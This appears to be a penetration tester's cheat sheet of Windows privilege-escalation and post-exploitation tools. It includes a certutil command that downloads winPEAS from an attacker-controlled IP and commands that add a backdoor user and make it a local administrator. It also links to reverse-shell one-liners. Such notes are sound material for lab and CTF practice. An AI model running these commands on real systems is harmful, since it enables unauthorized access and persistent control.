`winpeas`
search for possible paths to escalate privileges

`windows reverse shells one liners`
https://ironhackers.es/en/cheatsheet/comandos-en-windows-para-obtener-shell/

`empire`
pure PowerShell post-exploitation agent
https://www.ivoidwarranties.tech/posts/pentesting-tuts/empire/guide/

`systeminfo`
on windows get information about the host

`cerutil.exe`
download files (ala wget)
certutil.exe -urlcache -split -f "http://10.10.14.1:8000/winPEAS.bat" winPEAS.bat

`sc stop`
stop processes by name on windoz

`net user bacon ihazpassword /ADD`
Looking at the output of the ‘net user bacon ihazpassword /ADD’, we have successfully added a user account named “bacon”, from there we could issue **net localgroup administrators bacon /ADD** to get a local administrator on the system itself. We have full control over the system at this point.

`metasploit enum_patches module`
When confronted with  a Windows target, identifying which patches have been applied is an easy way of knowing if regular updates happen. It may also provide information on other possible vulnerabilities present on the system.